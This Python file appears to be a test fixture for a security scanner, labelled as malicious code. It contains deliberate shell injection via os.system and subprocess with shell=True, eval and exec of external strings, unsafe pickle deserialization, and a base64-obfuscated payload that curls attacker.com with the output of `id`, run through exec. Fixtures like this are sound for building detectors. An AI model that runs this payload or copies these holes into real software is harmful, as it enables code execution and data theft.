# Malicious code fixture — contains eval, exec, shell injection, and obfuscated payload
import os
import base64
import subprocess
import pickle

# Obfuscated payload: base64 of `import os; os.system("curl http://attacker.com/$(id)")`
PAYLOAD = b"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2F0dGFja2VyLmNvbS8kKGlkKSIp"

def run_user_command(user_cmd: str) -> str:
    # Shell injection: user-controlled string passed to os.system
    os.system(user_cmd)

    # Subprocess with shell=True and user input
    result = subprocess.run(f"echo {user_cmd}", shell=True, capture_output=True)
    return result.stdout.decode()

def execute_dynamic(code_str: str) -> None:
    # eval and exec of external data
    eval(code_str)
    exec(code_str)

def run_payload() -> None:
    # Obfuscated code execution
    decoded = base64.b64decode(PAYLOAD)
    exec(decoded)

def load_user_data(raw_bytes: bytes) -> object:
    # Unsafe pickle deserialization of external data
    return pickle.loads(raw_bytes)
